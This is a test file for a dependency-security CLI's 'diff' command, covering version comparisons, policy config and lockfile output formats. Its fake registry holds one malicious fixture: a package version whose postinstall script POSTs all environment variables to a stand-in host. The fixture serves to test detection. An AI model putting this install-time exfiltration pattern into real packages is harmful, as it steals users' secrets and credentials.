import { execFileSync } from "node:child_process";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createGateData, preloadAnalyzer } from "@depward/gate";
import { afterEach, beforeAll, beforeEach, describe, expect, test } from "vitest";
import { fakeRegistry, type FakeRegistry } from "../../diff/test/fake-registry.ts";
import { EXIT, main, type Io } from "../src/index.ts";

const NOW = Date.parse("2026-11-10T12:00:00.000Z");
const data = createGateData([], []);

function registry(): FakeRegistry {
  return fakeRegistry({
    "fx-a": {
      versions: {
        "1.0.0": {},
        "1.0.1": {
          files: { "index.js": 'module.exports = () => fetch("https://collect.example.invalid/e", { method: "POST", body: JSON.stringify(process.env) });\n' },
          scripts: { postinstall: "node index.js" },
        },
      },
    },
    "fx-b": { versions: { "2.0.0": {}, "2.0.1": { files: { "index.js": "module.exports = 3;\n" } } } },
  });
}

let cwd: string;
beforeAll(async () => {
  await preloadAnalyzer();
});
beforeEach(async () => {
  cwd = await mkdtemp(join(tmpdir(), "depward-cli-diff-"));
});
afterEach(async () => {
  await rm(cwd, { recursive: true, force: true });
});

async function run(argv: string[], reg: FakeRegistry = registry(), io: Partial<Io> = {}) {
  const out: string[] = [];
  const err: string[] = [];
  const code = await main(argv, {
    stdout: (s) => out.push(s),
    stderr: (s) => err.push(s),
    cwd,
    env: {},
    isTTY: false,
    now: () => 0,
    gate: { registry: reg.client, data, now: () => NOW },
    ...io,
  });
  return { code, out: out.join(""), err: err.join("") };
}

describe("diff: arguments", () => {
  test("--help prints the diff usage", async () => {
    const r = await run(["diff", "--help"]);
    expect(r.code).toBe(EXIT.allow);
    expect(r.out).toContain("Usage: depward diff");
  });

  test.each([
    [["diff"], "give <name> <fromVersion> <toVersion>"],
    [["diff", "a", "1.0.0"], "give <name>"],
    [["diff", "a", "1", "2", "--base", "main"], "--base and --head need --lockfile"],
    [["diff", "--lockfile", "a"], "takes no package arguments"],
    [["diff", "--lockfile", "--concurrency", "0"], "--concurrency must be"],
    [["diff", "--lockfile", "--format", "html"], "--format must be one of"],
    [["diff", "a", "1", "2", "--fail-on", "severe"], "--fail-on must be one of"],
  ])("%j is a usage error", async (argv, message) => {
    const r = await run(argv);
    expect(r.code).toBe(EXIT.error);
    expect(r.err).toContain(message);
    expect(r.err).toContain("Usage: depward diff");
  });
});

describe("diff <name> <from> <to>", () => {
  test("terminal output lists the findings of the update; critical fails by default", async () => {
    const r = await run(["diff", "fx-a", "1.0.0", "1.0.1"]);
    expect(r.code).toBe(EXIT.deny);
    expect(r.out).toMatchSnapshot();
  });

  test("--json carries the delta", async () => {
    const r = await run(["diff", "fx-a", "1.0.0", "1.0.1", "--json"]);
    const doc = JSON.parse(r.out) as { reportVersion: number; risk: string; packages: { kind: string; delta: { capabilities: unknown; scripts: unknown } }[] };
    expect(doc.reportVersion).toBe(1);
    expect(doc.risk).toBe("critical");
    expect(doc.packages[0]?.kind).toBe("updated");
    expect(doc.packages[0]?.delta.capabilities).toEqual({ added: ["net", "env"], removed: [] });
    expect(doc.packages[0]?.delta.scripts).toEqual({ postinstall: { to: "node index.js" } });
  });

  test.each([
    ["none", EXIT.allow],
    ["critical", EXIT.deny],
    ["high", EXIT.deny],
  ] as const)("--fail-on %s exits %i", async (level, code) => {
    expect((await run(["diff", "fx-a", "1.0.0", "1.0.1", "--fail-on", level])).code).toBe(code);
  });

  test("an update without findings passes even at --fail-on info", async () => {
    expect((await run(["diff", "fx-b", "2.0.0", "2.0.1", "--fail-on", "info"])).code).toBe(EXIT.allow);
  });

  test("config: allowed findings are shown as allowed and don't count", async () => {
    await writeFile(
      join(cwd, "depward.config.json"),
      JSON.stringify({ policy: { "diff-new-install-script": "allow", "diff-new-network-in-non-network-pkg": "allow" } }),
    );
    const r = await run(["diff", "fx-a", "1.0.0", "1.0.1", "--json"]);
    const doc = JSON.parse(r.out) as { risk: string; failOn: string; failed: boolean; packages: { allowedFindings: { id: string }[] }[] };
    // One high is left (diff-new-sensitive-env), so no two-high escalation.
    expect(doc).toMatchObject({ risk: "high", failOn: "critical", failed: false });
    expect(doc.packages[0]?.allowedFindings.map((f) => f.id)).toEqual(["diff-new-install-script", "diff-new-network-in-non-network-pkg"]);
    expect(r.code).toBe(EXIT.allow);
    const terminal = await run(["diff", "fx-a", "1.0.0", "1.0.1"]);
    expect(terminal.out).toContain("2 findings allowed by the config not shown");
  });

  test("config: an allow-listed package never fails; a deny-listed version always does", async () => {
    await writeFile(join(cwd, "depward.config.json"), JSON.stringify({ allow: ["fx-a"], deny: ["fx-b@2.0.1"] }));
    expect((await run(["diff", "fx-a", "1.0.0", "1.0.1"])).code).toBe(EXIT.allow);
    const denied = await run(["diff", "fx-b", "2.0.0", "2.0.1"]);
    expect(denied.code).toBe(EXIT.deny);
    expect(denied.out).toContain("on the config's deny list");
    expect(denied.out).toContain("denylisted");
  });

  test("an unknown version is a failed lookup: exit 1, report still printed", async () => {
    const r = await run(["diff", "fx-a", "1.0.0", "9.9.9"]);
    expect(r.code).toBe(EXIT.error);
    expect(r.out).toContain("lookup failed: NOT_FOUND: fx-a@9.9.9 is not in the registry");
  });
});

const git = (...args: string[]): string =>
  execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false", "-c", "core.autocrlf=false", ...args], { cwd, encoding: "utf8" });

const lock = (reg: FakeRegistry, versions: Record<string, string>): string =>
  JSON.stringify({
    name: "root",
    lockfileVersion: 3,
    packages: {
      "": { name: "root" },
      ...Object.fromEntries(
        Object.entries(versions).map(([name, version]) => [
          `node_modules/${name}`,
          { version, resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`, integrity: reg.integrity(name, version) },
        ]),
      ),
    },
  }, null, 2) + "\n"; // as npm writes it

/** A repo whose committed lockfile has fx-a 1.0.0 and fx-b 2.0.0, updated in the working tree. */
async function repo(reg: FakeRegistry): Promise<void> {
  git("init", "-q", "-b", "main");
  await writeFile(join(cwd, "package-lock.json"), lock(reg, { "fx-a": "1.0.0", "fx-b": "2.0.0" }));
  git("add", ".");
  git("commit", "-q", "-m", "base");
  await writeFile(join(cwd, "package-lock.json"), lock(reg, { "fx-a": "1.0.1", "fx-b": "2.0.1" }));
}

describe("diff --lockfile", () => {
  test("terminal output: flagged packages listed, quiet ones counted", async () => {
    const reg = registry();
    await repo(reg);
    const r = await run(["diff", "--lockfile", "--base", "main"], reg);
    expect(r.code).toBe(EXIT.deny);
    expect(r.out.replace(/base [0-9a-f]{12}/, "base <sha>")).toMatchSnapshot();
  });

  test("markdown has the summary table; SARIF points at the lockfile", async () => {
    const reg = registry();
    await repo(reg);
    const md = await run(["diff", "--lockfile", "--base", "main", "--format", "markdown"], reg);
    expect(md.out.replace(/<code>[0-9a-f]{12}<\/code> \(merge-base\)/,"<code><sha></code> (merge-base)")).toMatchSnapshot();
    const sarif = JSON.parse((await run(["diff", "--lockfile", "--base", "main", "--format", "sarif"], reg)).out) as {
      runs: { results: { locations: { physicalLocation: { artifactLocation: { uri: string }; region: { startLine: number } } }[] }[] }[];
    };
    const locations = sarif.runs[0]?.results.map((x) => x.locations[0]?.physicalLocation) ?? [];
    expect([...new Set(locations.map((l) => l?.artifactLocation.uri))]).toEqual(["package-lock.json"]);
    // Every result sits on fx-a's entry, a line the change touched.
    const lockLines = (await readFile(join(cwd, "package-lock.json"), "utf8")).split("\n");
    const lines = new Set(locations.map((l) => l?.region.startLine ?? 0));
    expect(lines.size).toBe(1);
    expect(lockLines[[...lines][0]! - 1]).toContain('"node_modules/fx-a"');
  });

  test("outside a git repository it fails with GIT", async () => {
    const r = await run(["diff", "--lockfile", "--base", "main"]);
    expect(r.code).toBe(EXIT.error);
    expect(r.err).toContain("GIT: not inside a git repository");
  });
});
